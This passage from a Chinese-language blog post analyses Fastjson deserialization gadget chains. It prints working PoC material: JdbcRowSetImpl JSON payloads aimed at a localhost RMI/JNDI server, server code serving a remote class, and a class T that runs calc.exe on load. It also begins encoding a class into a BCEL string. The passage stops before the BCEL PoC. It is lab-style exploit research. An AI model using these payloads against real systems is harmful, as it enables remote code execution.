class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get a JDBC connection.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// First check for Connection handle object as such if</span></span><br><span class="line">        <span class="comment">// &quot;this&quot; initialized  using conn.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(conn != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> conn;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Connect using JNDI.</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">                <span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSource)ctx.lookup</span><br><span class="line">                    (getDataSourceName());</span><br><span class="line">                <span class="comment">//return ds.getConnection(getUsername(),getPassword());</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(getUsername() != <span class="literal">null</span> &amp;&amp; !getUsername().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                     <span class="keyword">return</span> ds.getConnection(getUsername(),getPassword());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                     <span class="keyword">return</span> ds.getConnection();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (javax.naming.NamingException ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getUrl() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// Check only for getUrl() != null because</span></span><br><span class="line">            <span class="comment">// user, passwd can be null</span></span><br><span class="line">            <span class="comment">// Connect using the driver manager.</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> DriverManager.getConnection</span><br><span class="line">                    (getUrl(), getUsername(), getPassword());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>接下来我们来看到<strong>getDataSourceName</strong>和<strong>setDataSourceName</strong>方法。</li>
<li>因此通过观察这三个方法，我们知道可以先通过调用<strong>setDataSourceName</strong>方法对<strong>dataSource</strong>属性进行赋值，然后<strong>getDataSourceName</strong>的返回值就变成了我们控制的值，符合JSON反序列化注入的逻辑。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDataSourceName</span><span class="params">(String dsName)</span> <span class="keyword">throws</span> SQLException&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span>(!getDataSourceName().equals(dsName)) &#123;</span><br><span class="line">            <span class="built_in">super</span>.setDataSourceName(dsName);</span><br><span class="line">            conn = <span class="literal">null</span>;</span><br><span class="line">            ps = <span class="literal">null</span>;</span><br><span class="line">            rs = <span class="literal">null</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">super</span>.setDataSourceName(dsName);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//在父类中BaseRowSet</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDataSourceName</span><span class="params">(String name)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">           dataSource = <span class="literal">null</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;DataSource name cannot be empty string&quot;</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          dataSource = name;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       URL = <span class="literal">null</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getDataSourceName</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> dataSource;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>那么既然我们知道参数已经可控了，那么接下来我们就要分析能否调用<strong>connect()<strong>方法了。通过对当前类的查找，我们看到可以看到有三个方法调用了</strong>connect()<strong>方法，分别是</strong>getDatabaseMetaData</strong>，<strong>setAutoCommit</strong>，prepare，且他们方法都为public修饰。那么我们最能能够直接观察到可利用的就是<strong>getDatabaseMetaData</strong>，<strong>setAutoCommit</strong>方法因为他们符合我们之前说的getter和setter方法，prepare可能可以利用，可以看看其他的是否有调用他的，这我就不分析了，因为有其他更好利用的方法，</p>
</li>
<li><p>在这两个方法<strong>getDatabaseMetaData</strong>，<strong>setAutoCommit</strong>，优先考虑肯定是是<strong>setAutoCommit</strong>，因为如果我们在JSON中传入一个AutoCommit的值的话会优先调用set方法会比get方法优先调用，且如果代码中使用的是<strong>parse</strong>方法去解析的JSON的话，则是不会解析get方法的，因此肯定考虑set方法。</p>
</li>
<li><p>那么我们接下来观察setAutoCommit方法。</p>
</li>
<li><p>通过观察setAutoCommit的代码，基本上可以确定是可以调用的，通过对autoCommit参数进行赋值，就会调用的connect()方法中。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> autoCommit)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="comment">// The connection object should be there</span></span><br><span class="line">        <span class="comment">// in order to commit the connection handle on or off.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(conn != <span class="literal">null</span>) &#123;</span><br><span class="line">           conn.setAutoCommit(autoCommit);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">// Coming here means the connection object is null.</span></span><br><span class="line">           <span class="comment">// So generate a connection handle internally, since</span></span><br><span class="line">           <span class="comment">// a JdbcRowSet is always connected to a db, it is fine</span></span><br><span class="line">           <span class="comment">// to get a handle to the connection.</span></span><br><span class="line"></span><br><span class="line">           <span class="comment">// Get hold of a connection handle</span></span><br><span class="line">           <span class="comment">// and change the autcommit as passesd.</span></span><br><span class="line">           conn = connect();</span><br><span class="line"></span><br><span class="line">           <span class="comment">// After setting the below the conn.getAutoCommit()</span></span><br><span class="line">           <span class="comment">// should return the same value.</span></span><br><span class="line">           conn.setAutoCommit(autoCommit);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-1-2-POC分析"><a href="#2-1-2-POC分析" class="headerlink" title="2.1.2.POC分析"></a>2.1.2.POC分析</h3><ul>
<li>我们一共需要调用两个方法<strong>setDataSourceName，setAutoCommit</strong>，我们首先通过setDataSourceName对dsName进行赋值。</li>
<li>由于set方法的调用的顺序是JSON串中考前的先调用，因此我们先配置<strong>DataSourceName</strong>赋值，在对<strong>AutoCommit</strong>赋值即可，再强调一下，JSON的赋值只和方法名有关，和属性值的属性名无关。</li>
<li>首先DataSourceName的值，由于是lookup函数，且我的环境是8u65版本，因此使用jndi或者rmi或者使用dns探测都可以，我这我了演示，就使用rmi服务器进行吧。因此设置的值为<code>rmi://localhost:1099/remoteObj</code></li>
<li>然后是AutoCommit的值，为任意整型或者boolean类型即可，因为整型和布尔型都可以过boolean类型的参数检测。不会报错中断线程。</li>
<li>还有一个最重要的参数自然是配置我们需要反序列化的类。</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;DataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span><span class="punctuation">,</span><span class="attr">&quot;AutoCommit&quot;</span><span class="punctuation">:</span><span class="number">111</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>jndirmi服务器部署</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">RemoteObjImpl</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;remoteObj&quot;</span>, remoteObj);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------------RMIServer start success------------------------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;T&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------------RMIJNDIServer start success------------------------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>编译恶意类javac T.java</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">T</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;<span class="comment">//在静态代码块中执行恶意代码。</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>启动python http服务器</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250319152928524.png?x-oss-process=style/img-to-webp" alt="image-20250319152928524"></p>
<h3 id="2-1-3-流程分析"><a href="#2-1-3-流程分析" class="headerlink" title="2.1.3.流程分析"></a>2.1.3.流程分析</h3><ol>
<li>首先通过DefaultFieldDeserializer调用setValue方法，反射调用setDataSourceName的方法对属性进行赋值。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250319154150273.png?x-oss-process=style/img-to-webp" alt="image-20250319154150273"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250319154234506.png?x-oss-process=style/img-to-webp" alt="image-20250319154234506"></p>
<ol start="2">
<li>然后进入到JdbcRowSetImpl核心调用逻辑。给DataSourceName进行赋值。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250319154459461.png?x-oss-process=style/img-to-webp" alt="image-20250319154459461"></p>
<ol start="3">
<li>再反射调用setAutoCommit方法的connect()方法。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250319154641365.png?x-oss-process=style/img-to-webp" alt="image-20250319154641365"></p>
<ol start="4">
<li>然后再调用connect方法中的lookup函数远程jndirmi服务器，再调用远程的恶意类，进行加载。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250319155213412.png?x-oss-process=style/img-to-webp" alt="image-20250319155213412"></p>
<h3 id="2-1-4-总结"><a href="#2-1-4-总结" class="headerlink" title="2.1.4.总结"></a>2.1.4.总结</h3><ul>
<li>该链的主要逻辑就是通过调用java原生的<strong>JdbcRowSetImpl</strong>方法，通过JSON反序列化为首先调用<strong>setDataSourceName</strong>方法进行传参，然后再调用<strong>setAutoCommit</strong>方法来调用lookup函数，调用远程的jdni服务器，实现jndi注入。</li>
</ul>
<h3 id="2-1-5-思考"><a href="#2-1-5-思考" class="headerlink" title="2.1.5.思考"></a>2.1.5.思考</h3><ul>
<li>有个问题，那就是说，既然再praseObject方法中会遍历调用所有的get方法，那按道理调用<strong>setDataSourceName</strong>后，不需要再<strong>setAutoCommit</strong>方法，因为在<strong>JdbcRowSetImpl</strong>方法中还有一个方法，那就是getDatabaseMetaData方法，也调用了connect()方法。</li>
<li>那么是否能在不调用<strong>setAutoCommit</strong>的情况下通过自动调用get方法执行远程代码。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> DatabaseMetaData <span class="title function_">getDatabaseMetaData</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> connect();</span><br><span class="line">    <span class="keyword">return</span> con.getMetaData();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这次我们不设置autoCommit参数，POC如下。</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;DataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>我们实践一下发现，在执行代码前就抛出异常终止了当前线程。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250319161825309.png?x-oss-process=style/img-to-webp" alt="image-20250319161825309"></p>
<ul>
<li>我们调试一下，看异常问题出在哪。</li>
<li>通过对代码调试我们发现，在调用getDatabaseMetaData方法前调用isAfterLast方法。使用过java原生的jdbc连接数据的朋友都知道，该方法是对sql查询的结果集向后走一个索引。但是我们是我们并没有提供一个正确的链接，因此肯定得不到结果集，执行索引偏移肯定会报错，所以没办法继续执行后面的代码。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250319162353531.png?x-oss-process=style/img-to-webp" alt="image-20250319162353531"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250319163507235.png?x-oss-process=style/img-to-webp" alt="image-20250319163507235"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250319162750345.png?x-oss-process=style/img-to-webp" alt="image-20250319162750345"></p>
<ul>
<li>所以这条路走不通。</li>
</ul>
<h2 id="2-2-TemplatesImpl（不出网利用）"><a href="#2-2-TemplatesImpl（不出网利用）" class="headerlink" title="2.2.TemplatesImpl（不出网利用）"></a>2.2.TemplatesImpl（不出网利用）</h2><ul>
<li>这条链我就不详细分析了，因为之前在分析CC链的时候已经分析过这条链，且只是原因之一，最重要的原因还是这条链的利用范围太窄了，需要在解析JSON串的时候设置<strong>Feature.SupportNonPublicField</strong>，所以利用范围很低，当然还有一个最根本的原因就是我懒得分析，已经分析过了:laughing:。</li>
<li>同时设置<strong>Feature.SupportNonPublicField</strong>后，系统不再调用Setter方法，因为需要设置私有属性的值，因此主要是通过反射调用实现。</li>
<li>该条链中，最主要的内容通过调用getOutputProperties方法实现的。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-3-Becl-（不出网利用）"><a href="#2-3-Becl-（不出网利用）" class="headerlink" title="2.3. Becl （不出网利用）"></a>2.3. Becl （不出网利用）</h2><h3 id="2-3-1-利用条件"><a href="#2-3-1-利用条件" class="headerlink" title="2.3.1.利用条件"></a>2.3.1.利用条件</h3><ul>
<li>需要具有tomcat dbcp依赖</li>
</ul>
<h3 id="2-3-2-类分析"><a href="#2-3-2-类分析" class="headerlink" title="2.3.2.类分析"></a>2.3.2.类分析</h3><ul>
<li>我们可以看到BasicDataSource类中的createConnectionFactory方法，该方法为我们提供了一个提议加载字节码的地方，不过这部分字节码需要在前面加入BCEL的标识符即$$BCEL$$，以及还需要传入一个类加载器。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250324105313455.png?x-oss-process=style/img-to-webp" alt="image-20250324105313455"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250324110240757.png?x-oss-process=style/img-to-webp" alt="image-20250324110240757"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250324110324522.png?x-oss-process=style/img-to-webp" alt="image-20250324110324522"></p>
<ul>
<li>因此我们现在的思路就是看driverClassName和driverClassLoader，是否可控，经过对当前类的查找，我们找到以下方法。因此两个参数都有对应的Getter和Setter方法，我们可以直接通过JSON反序列化进行赋值。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">setDriverClassName</span><span class="params">(String driverClassName)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((driverClassName != <span class="literal">null</span>) &amp;&amp; (driverClassName.trim().length() &gt; <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.driverClassName = driverClassName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.driverClassName = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.restartNeeded = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">setDriverClassLoader</span><span class="params">(</span></span><br><span class="line"><span class="params">        ClassLoader driverClassLoader)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.driverClassLoader = driverClassLoader;</span><br><span class="line">    <span class="built_in">this</span>.restartNeeded = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>既然参数可控了，接下来我们分析一下能否调用createConnectionFactory方法，我们通过对当前类的查找，看到了createDataSource方法，其中就调用了createConnectionFactory方法，但是createDataSource不是set&#x2F;get&#x2F;is方法，因此没办法进行调用，我们再往上级查找，发现当前类一共有setLogWriter，getLogWriter，getConnection。</li>
<li>首先我们先来考虑，setLogWriter方法，因为我们对字段进行赋值的化，我们可以定义set方法的执行顺序，且set方法会比get方法先执行，不过我们来看到该方法的参数时，需要传入一个PrintWriter，类型的对象，而该对象没有默认的构造方法，我们还需要对其进行传参，因此实现起来会比较麻烦，我们再尝试看看get方法。</li>
<li>getConnection方法，因为get方法没办法定义顺序顺序，因此我们有限看ascii码靠前的方法。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">return</span> createDataSource().getConnection();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>我们看到getConnection方法直接就调用了createDataSource方法，因此这是以恶好方法，只要保证当前类的ascii码c之前的get方法执行时不会抛出无法处理的异常，则可以正常执行到getConnection()，实现类加载。</li>
</ul>
<h3 id="2-3-3-PoC分析"><a href="#2-3-3-PoC分析" class="headerlink" title="2.3.3.PoC分析"></a>2.3.3.PoC分析</h3><ul>
<li>首先我们需要先获得一个BCEL格式字节码字符串。</li>
<li>直接利用读文件将本地的恶意类加载，并且进行编码格式化。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\tmp\\T.class&quot;</span>));</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span>  <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(bytes, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>接下来我们就是需要设置driverClassName和driverClassLoader的值。构造Poc如下</li>
</ul>
